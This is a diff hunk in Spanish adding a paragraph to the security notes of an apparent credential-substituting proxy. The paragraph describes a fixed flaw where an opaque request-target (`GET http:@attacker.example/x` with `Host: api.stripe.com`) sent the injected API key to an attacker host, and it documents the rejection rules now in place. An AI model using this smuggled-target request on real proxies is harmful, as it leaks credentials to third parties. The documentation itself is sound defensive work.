@@ -250,6 +250,16 @@ solo al crear: un `../../etc` saldría del directorio de datos.
   invitado que gotea bytes para retener una plaza no la retiene más de 15 min. Un corte
   aborta la conexión, así que el invitado ve un error y no una respuesta truncada que
   parezca completa.
+- **La salida va siempre al Host de la credencial.** La URL hacia el proveedor se
+  monta por campos (`https`, el Host con el que se eligió la credencial, la ruta y la
+  query), nunca pegando el request-target del invitado tras el host. Antes un
+  request-target opaco (`GET http:@attacker.example/x` con `Host: api.stripe.com`)
+  salía hacia `https://api.stripe.com@attacker.example/x`: la clave, ya sustituida en
+  las cabeceras, iba al atacante con TLS verificado contra él y sin pasar por la
+  allowlist. Ahora se rechaza con 400, sin leer el cuerpo ni abrir la salida, todo
+  request-target que no sea una ruta absoluta o el absolute-form `http(s)` del mismo
+  Host: opaco, con usuario (`http://u@host/`), con otro esquema, hacia otro host o que
+  no empiece por `/` (`OPTIONS *`). CONNECT sigue siendo un 405.
 - **Permisos por método y ruta** (`-allow-request 'GET /v1/balance'`, `Allow` en la API):
   una credencial con permisos solo se sustituye en las peticiones que casan. Si ninguna
   credencial del Host casa, el proxy responde 403 y cierra la conexión sin leer el
